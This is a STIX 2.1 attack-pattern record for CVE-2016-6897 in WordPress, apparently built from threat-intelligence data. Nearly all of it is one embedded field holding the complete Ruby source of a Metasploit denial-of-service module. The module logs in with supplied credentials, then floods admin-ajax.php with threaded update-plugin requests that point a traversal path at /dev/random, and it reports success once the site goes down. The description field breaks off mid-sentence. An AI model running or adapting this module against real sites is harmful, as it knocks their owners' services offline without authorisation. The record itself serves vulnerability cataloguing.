{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e551feac-93ec-4371-900f-e6be7796240a",
    "created": "2024-08-14T16:26:03.373843Z",
    "modified": "2024-08-14T16:26:03.373847Z",
    "name": "WordPress Traversal Directory DoS",
    "description": " Cross-site request forgery (CSRF) vulnerability in the wp_ajax_update_plugin function in wp-admin/includes/ajax-actions.php in WordPress before 4.6 allows remote attackers to hijack the authentication of subscribers for /dev/random read operations by leveraging a late call to",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/wordpress_directory_traversal_dos.rb",
            "external_id": "wordpress_directory_traversal_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6897"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress Traversal Directory DoS',\n      'Description'     =>  %q{\n        Cross-site request forgery (CSRF) vulnerability in the wp_ajax_update_plugin\n        function in wp-admin/includes/ajax-actions.php in WordPress before 4.6\n        allows remote attackers to hijack the authentication of subscribers\n        for /dev/random read operations by leveraging a late call to\n        the check_ajax_referer function, a related issue to CVE-2016-6896.},\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Yorick Koster',           # Vulnerability disclosure\n          'CryptisStudents'          # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2016-6897'],\n          ['EDB', '40288'],\n          ['OVE', 'OVE-20160712-0036']\n        ],\n    ))\n\n    register_options(\n      [\n        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),\n        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),\n        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),\n        OptInt.new('DEPTH', [true, 'The depth of the path', 10]),\n        OptString.new('USERNAME', [true, 'The username to send the requests with', '']),\n        OptString.new('PASSWORD', [true, 'The password to send the requests with', ''])\n        ])\n  end\n\n  def rlimit\n    datastore['RLIMIT']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def thread_count\n    datastore['THREADS']\n  end\n\n  def timeout\n    datastore['TIMEOUT']\n  end\n\n  def depth\n    datastore['DEPTH']\n  end\n\n  def user_exists(user)\n    exists = wordpress_user_exists?(user)\n    if exists\n      print_good(\"Username \\\"#{user}\\\" is valid\")\n      return true\n    else\n      print_error(\"\\\"#{user}\\\" is not a valid username\")\n      return false\n    end\n  end\n\n  def run\n    if wordpress_and_online?\n      print_status(\"Checking if user \\\"#{username}\\\" exists...\")\n      unless user_exists(username)\n        print_error('Aborting operation - a valid username must be specified')\n        return\n      end\n\n      starting_thread = 1\n\n      cookie  = wordpress_login(username, password)\n      store_valid_credential(user: username, private: password, proof: cookie)\n      if cookie.nil?\n        print_error('Aborting operation - failed to authenticate')\n        return\n      end\n\n      path = \"/#{'../' * depth}dev/random\"\n\n      while starting_thread < rlimit do\n        ubound = [rlimit - (starting_thread - 1), thread_count].min\n        print_status(\"Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...\")\n\n        threads = []\n        1.upto(ubound) do |i|\n          threads << framework.threads.spawn(\"Module(#{self.refname})-request#{(starting_thread - 1) + i}\", false, i) do |i|\n            begin\n              # shell code\n              res = send_request_cgi( opts = {\n                'method' => 'POST',\n                'uri' => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),\n                'vars_post' => {\n                  'action' => 'update-plugin',\n                  'plugin' => path\n                },\n                'cookie' => cookie\n              }, timeout = 0.2)\n            rescue => e\n              print_error(\"Timed out during request #{(starting_thread - 1) + i}\")\n            end\n          end\n        end\n\n        threads.each(&:join)\n\n        print_good(\"Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}\")\n        starting_thread += ubound\n      end\n\n      if wordpress_and_online?\n        print_error(\"FAILED: #{target_uri} appears to still be online\")\n      else\n        print_good(\"SUCCESS: #{target_uri} appears to be down\")\n      end\n\n    else\n      print_error(\"#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}